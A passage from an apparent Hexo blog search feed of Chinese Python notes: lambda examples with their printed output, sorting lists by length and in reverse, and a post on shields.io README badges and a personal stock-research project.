是一个表达式，而不是一个语句，即我们可以在任何可以使用表达式的场景一样使用lambda。<br>lambda 的主体也是一个表达式，即和def定义的函数一样，lambda也有函数主体，不过lambda的主体仅仅是一个表达式，所以其使用的功能受到较大的限制。<br>‘’’</p><h4 id="lambda-匿名函数。"><a href="#lambda-匿名函数。" class="headerlink" title="lambda 匿名函数。"></a>lambda 匿名函数。</h4><h6 id="可以将lambda直接传递给一个变量，像调用一般函数一样使用"><a href="#可以将lambda直接传递给一个变量，像调用一般函数一样使用" class="headerlink" title="可以将lambda直接传递给一个变量，像调用一般函数一样使用"></a>可以将lambda直接传递给一个变量，像调用一般函数一样使用</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">B = <span class="hljs-keyword">lambda</span> :<span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(B())<br></code></pre></td></tr></table></figure><p> 等价于</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">BF</span>():</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-built_in">print</span>(BF())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">sum_with_100 = <span class="hljs-keyword">lambda</span> x, y=<span class="hljs-number">100</span>: x + y<br><span class="hljs-comment"># 等同于：</span><br><span class="hljs-comment"># def sum_with_100(x, y=100): return x + y</span><br><span class="hljs-built_in">print</span>(sum_with_100(<span class="hljs-number">200</span>))<br><br></code></pre></td></tr></table></figure><p>从后面传参<br>之前的示例我们将lambda匿名函数赋值一个变量，通过类似def定义的函数的方式传参，我们可以在lambda后面直接传递参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python">two_sum = (<span class="hljs-keyword">lambda</span> x, y: x + y)(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)<br><span class="hljs-built_in">print</span>(two_sum)<br><br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sum</span>(<span class="hljs-params">x</span>):</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">lambda</span> y: x + y<br>sum_with_100 = <span class="hljs-built_in">sum</span>(<span class="hljs-number">100</span>)<br><span class="hljs-built_in">print</span>(sum_with_100)<br>result = sum_with_100(<span class="hljs-number">200</span>)<br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><h5 id="1-结合三元表达式求两值中最小值"><a href="#1-结合三元表达式求两值中最小值" class="headerlink" title="1. 结合三元表达式求两值中最小值"></a>1. 结合三元表达式求两值中最小值</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">lower = <span class="hljs-keyword">lambda</span> x,y: x <span class="hljs-keyword">if</span> x&lt;y <span class="hljs-keyword">else</span> y<br><span class="hljs-built_in">print</span>(lower(<span class="hljs-number">7</span>,<span class="hljs-number">100</span>))<br></code></pre></td></tr></table></figure><h5 id="2-对字典某一键值进行排序"><a href="#2-对字典某一键值进行排序" class="headerlink" title="2. 对字典某一键值进行排序"></a>2. 对字典某一键值进行排序</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">d = [&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">3</span>&#125;,&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">1</span>&#125;,&#123;<span class="hljs-string">&quot;order&quot;</span>:<span class="hljs-number">2</span>&#125;]<br><span class="hljs-comment"># 根据order键值排序</span><br>d.sort(key=<span class="hljs-keyword">lambda</span> x:x[<span class="hljs-string">&#x27;order&#x27;</span>])<br><span class="hljs-built_in">print</span>(d)<br></code></pre></td></tr></table></figure><h4 id="result"><a href="#result" class="headerlink" title="result"></a>result</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">2</span><br><span class="hljs-number">10.0492172</span><br><span class="hljs-literal">True</span><br><span class="hljs-literal">True</span><br><span class="hljs-number">300</span><br><span class="hljs-number">7</span><br>&lt;function <span class="hljs-built_in">sum</span>.&lt;<span class="hljs-built_in">locals</span>&gt;.&lt;<span class="hljs-keyword">lambda</span>&gt; at <span class="hljs-number">0x0000018272C56AF0</span>&gt;<br><span class="hljs-number">300</span><br><span class="hljs-number">7</span><br>[&#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-string">&#x27;order&#x27;</span>: <span class="hljs-number">3</span>&#125;]<br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>列表的高级排序</title>
      <link href="/2016/04/20/%E5%88%97%E8%A1%A8%E7%9A%84%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F/"/>
      <url>/2016/04/20/%E5%88%97%E8%A1%A8%E7%9A%84%E9%AB%98%E7%BA%A7%E6%8E%92%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <h4 id="按列表中元素的长度排序"><a href="#按列表中元素的长度排序" class="headerlink" title="按列表中元素的长度排序"></a>按列表中元素的长度排序<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>x = [<span class="hljs-string">&#x27;xxxbdfxsdfasdfasdfsdfasdfasdfasdfasdf&#x27;</span>,<span class="hljs-string">&#x27;asdfj&#x27;</span>,<span class="hljs-string">&#x27;asdfsjadflk&#x27;</span>,<span class="hljs-string">&#x27;dfgadsfgdg&#x27;</span>,<span class="hljs-string">&#x27;dsfasdfasdfasdfasdf&#x27;</span>,<span class="hljs-string">&#x27;asdfasdfqwetyhjyhjghfj&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort(key=<span class="hljs-built_in">len</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-string">&#x27;asdfj&#x27;</span>, <span class="hljs-string">&#x27;dfgadsfgdg&#x27;</span>, <span class="hljs-string">&#x27;asdfsjadflk&#x27;</span>, <span class="hljs-string">&#x27;dsfasdfasdfasdfasdf&#x27;</span>, <span class="hljs-string">&#x27;asdfasdfqwetyhjyhjghfj&#x27;</span>, <span class="hljs-string">&#x27;xxxbdfxsdfasdfasdfsdfasdfasdfasdfasdf&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><br></code></pre></td></tr></table></figure><h4 id="反转排序"><a href="#反转排序" class="headerlink" title="反转排序"></a>反转排序</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><br><span class="hljs-meta">&gt;&gt;&gt; </span>x = [<span class="hljs-number">3</span>,<span class="hljs-number">12</span>,<span class="hljs-number">5</span>,<span class="hljs-number">76</span>,<span class="hljs-number">8</span>,<span class="hljs-number">435435</span>,<span class="hljs-number">9</span>,<span class="hljs-number">4</span>,<span class="hljs-number">1234</span>,<span class="hljs-number">1343</span>,<span class="hljs-number">43545</span>,<span class="hljs-number">1234</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort(reverse=<span class="hljs-literal">True</span>)<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-number">435435</span>, <span class="hljs-number">43545</span>, <span class="hljs-number">1343</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">76</span>, <span class="hljs-number">12</span>, <span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>x.sort()<br><span class="hljs-meta">&gt;&gt;&gt; </span>x<br>[<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">12</span>, <span class="hljs-number">76</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1234</span>, <span class="hljs-number">1343</span>, <span class="hljs-number">43545</span>, <span class="hljs-number">435435</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span><br><br><br><br><br><br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 列表，序列数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>editreadme</title>
      <link href="/2016/01/07/editreadme/"/>
      <url>/2016/01/07/editreadme/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css"><div class=".article-gallery" <p><a href="https://img.shields.io/badge/language-python3-brightgreen.svg?style=plastic" title="test" class="gallery-item"><img src="https://img.shields.io/badge/language-python3-brightgreen.svg?style=plastic" alt="test"></a><p></p><p><a href="https://travis-ci.org/meolu/docs.svg?branch=master" title="test" class="gallery-item"><img src="https://travis-ci.org/meolu/docs.svg?branch=master" alt="test"></a></p><p><a class="gallery-item"><img src="https://img.shields.io/github/license/zhuxinkai/python3-book-practice"></a></p><p><a href="https://img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases" title="GitHub release (latest by date including pre-releases)" class="gallery-item"><img src="https://img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases" alt="GitHub release (latest by date including pre-releases)"></a></p><p><a href="https://img.shields.io/github/languages/code-size/zhuxinkai/python3-book-practice" title="GitHub code size in bytes" class="gallery-item"><img src="https://img.shields.io/github/languages/code-size/zhuxinkai/python3-book-practice" alt="GitHub code size in bytes"></a></p><span id="more"></span><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs javascript">![test](https:<span class="hljs-comment">//img.shields.io/badge/language-python3-brightgreen.svg?style=plastic)</span><br><br>![test](https:<span class="hljs-comment">//travis-ci.org/meolu/docs.svg?branch=master)</span><br><br><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span> = <span class="hljs-string">&#x27;https://img.shields.io/github/license/zhuxinkai/python3-book-practice&#x27;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><br>其中的license 获取的是项目的LICENSE文件的内容。<br><br><br><br>![GitHub release (latest by date including pre-releases)](https:<span class="hljs-comment">//img.shields.io/github/v/release/zhuxinkai/python3-book-practice?include_prereleases)</span><br><br></code></pre></td></tr></table></figure><h1 id="从shields-io-网站获取的类表里面，可以通过读取github项目的，relsease-version-workflow-license-文件等生成项目的svg。-还包括了4中复制方式。（text-html-markdown-ascill-doc-当然，看到github也有相关的图标，没有去深入的看了。。"><a href="#从shields-io-网站获取的类表里面，可以通过读取github项目的，relsease-version-workflow-license-文件等生成项目的svg。-还包括了4中复制方式。（text-html-markdown-ascill-doc-当然，看到github也有相关的图标，没有去深入的看了。。" class="headerlink" title="从shields.io 网站获取的类表里面，可以通过读取github项目的，relsease ,version, workflow, license 文件等生成项目的svg。 还包括了4中复制方式。（text,html,markdown,ascill doc),当然，看到github也有相关的图标，没有去深入的看了。。"></a>从shields.io 网站获取的类表里面，可以通过读取github项目的，relsease ,version, workflow, license 文件等生成项目的svg。 还包括了4中复制方式。（text,html,markdown,ascill doc),当然，看到github也有相关的图标，没有去深入的看了。。</h1><p><a href="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/httpsshields.png" class="gallery-item"><img src="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/httpsshields.png" width="800" height="750" align="middle"></a> </p><h1 id="stock-research"><a href="#stock-research" class="headerlink" title="stock-research"></a>stock-research</h1><h4 id="1-1-目标"><a href="#1-1-目标" class="headerlink" title="1.1 目标"></a>1.1 目标</h4><p>希望通过一些数据分析，能够获取到选取股票的一些方式。毕竟大盘的数据量太大。这个需要完全自动化的实现，并且，需要有好的报表进行展现到网页。</p><h6 id="2020年6月17日早-8：41-更新"><a href="#2020年6月17日早-8：41-更新" class="headerlink" title="2020年6月17日早 8：41 更新"></a>2020年6月17日早 8：41 更新</h6><h4 id="1-2-注意事项"><a href="#1-2-注意事项" class="headerlink" title="1.2 注意事项"></a>1.2 注意事项</h4><p>项目中的token 是 tushare网站注册而来，请想要用此项目的人员，自行替换相关的token.<br>不要使用自带的token .因为这个token 是本人使用。</p><h4 id="1-3-昨天看视频，量化分析。"><a href="#1-3-昨天看视频，量化分析。" class="headerlink" title="1.3 昨天看视频，量化分析。"></a>1.3 昨天看视频，量化分析。</h4><p>其中介绍如何通过python 进行股票的量化分析。虽然指标过于简单（仅仅根据市值大小来的排名来进行投资，是指排最小的前10位进行交易）<br>但是其中的思想还是很值得借鉴的。而且市值也是一个好的指标，形成一个复合，并配置不同的权重，最终得出相应的选股结论指标。。</p><h5 id="1-3-1-通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈"><a href="#1-3-1-通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈" class="headerlink" title="1.3.1     通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈"></a>1.3.1     通过两天的观察，感觉，交易量增长2倍以上，是一个很好的卖出信号。。哈哈</h5><h1 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h1><h4 id="2-1-运行"><a href="#2-1-运行" class="headerlink" title="2.1 运行"></a>2.1 运行</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 httprestful.py<br><br></code></pre></td></tr></table></figure><p>即可。其中的 emailmodule ,使用来发送结果的模块。。 date_fomat是用来格式化日期的。</p><h4 id="2-2-后续优化"><a href="#2-2-后续优化" class="headerlink" title="2.2 后续优化"></a>2.2 后续优化</h4><p>后续会在参数的输入可控，以及相应的输出图表化，或者文件化展示方面进行优化。</p><h6 id="2020年6月19日9：26更新"><a href="#2020年6月19日9：26更新" class="headerlink" title="2020年6月19日9：26更新"></a>2020年6月19日9：26更新</h6><a href="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/code-test.png" class="gallery-item"><img src="https://raw.githubusercontent.com/zhuxinkai/hexo-images/master/code-test.png" width="800" height="600" align="middle"></a></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> .md文件编辑 </tag>
            
            <tag> 图标(svg)in https://shields.io/ </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
